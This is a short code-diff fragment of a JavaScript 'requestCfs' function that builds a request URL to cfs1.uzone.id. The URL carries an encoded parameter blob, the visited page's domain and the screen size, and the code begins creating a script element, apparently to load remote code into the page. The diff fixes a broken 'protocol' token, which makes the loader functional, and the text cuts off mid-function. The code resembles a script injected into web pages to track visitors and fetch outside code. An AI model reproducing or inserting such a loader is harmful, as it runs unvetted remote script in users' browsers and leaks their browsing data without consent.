@@ -72,7 +72,7 @@ if (self==top) {
     }
     function requestCfs()
     {
-        var idc_glo_url = (location.protoco l== "https:" ? "https://" : "http://");
+        var idc_glo_url = (location.protocol== "https:" ? "https://" : "http://");
         var idc_glo_r = Math.floor(Math.random()*99999999999);
         var url = idc_glo_url+ "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKo3mE%2fGaaTKVo6uAa97BTXVwSww15sQZ%2bBuzaubn5n8dE3vd2%2fahLP4WkD4V0eHzXWE%2fNIc2IBqs8wytcKK3%2fRDXvJaAp5c6CFSLEBbfyi3cWorb789vzFzuY8IfK6XfTKhNkPSPijqvB3lfELVy85yuQIKeZey6bfY6smo%2bN6bHPzwjQsAeHNoqjCEZRvl1a7gm%2f1WcmSI0xNfIMJtjDjDp4YWXWEr3UlUcKhu%2biPs7QESaXeDWA2%2fFLcgT4dlbqhdOsjl2SdMVqi40hQITkRqeqJHUCYbT40DdbC0LHc4xWRxGsxZTU4x66GpXdoQrvbwyDCkeN%2byE%2f8F8yh60iEL8gj1TvDHsXUAOmWY8ljINtwf8PHGoqnmpn9aYIfT4Kb%2f7c5aZ3Um%2bo%2fmETWTVr7k4QU4PU1EChMZ9gUlx61wTWEDJ4YsW8dp3xF4o9EF5AteBFc4kjbjKgVl3j%2brApWFtIjZUyapXfrD77%2fj69oSCjs3iSohnEN9UaMGbLkr2Lv06Trdey09Ihl2glV1QL7jF4Aj4NjZ31SK%2bnF4DtChxCrtqxCQ2KhGXtniL7cbcR" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;
         var bsa = document.createElement('script');
